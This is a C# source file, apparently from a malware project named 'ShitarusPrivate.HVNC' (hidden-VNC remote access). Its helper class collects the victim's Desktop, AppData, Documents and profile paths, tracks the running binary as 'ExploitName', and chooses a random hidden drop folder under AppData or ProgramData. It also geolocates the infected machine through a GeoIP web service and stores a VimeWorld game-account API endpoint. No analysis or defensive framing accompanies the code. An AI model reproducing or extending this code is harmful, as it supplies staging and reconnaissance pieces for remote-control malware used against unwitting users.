using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal class Help
    {
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

        public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);

        public static string[] SysPatch = new string[3] { AppData, LocalData, CommonData };

        public static string zxczxczxc = SysPatch[new Random().Next(0, SysPatch.Length)];

        public static string ExploitDir = Path.Combine(zxczxczxc, "44");

        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

        public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");

        public static string VimeAPI = "https://api.vimeworld.ru/user/name/";

        public static string GeoIP = "https://freegeoip.app/xml/";

        public static XmlDocument xml = new XmlDocument();

        public static bool check = true;

        public static void Ethernet()
        {
            try
            {
                xml.LoadXml(new WebClient().DownloadString(GeoIP));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex?.ToString() + "Ethernet()");
                check = false;
            }
        }
    }
}
